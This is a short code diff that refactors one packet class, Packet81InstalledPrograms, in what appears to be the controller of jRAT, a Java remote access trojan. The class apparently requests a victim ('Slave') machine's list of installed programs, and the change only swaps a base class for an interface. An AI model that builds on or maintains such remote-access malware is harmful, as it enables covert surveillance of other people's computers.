@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet81InstalledPrograms extends AbstractOutgoingPacket {
+public class Packet81InstalledPrograms implements OutgoingPacket {
 
 	private String location;
 
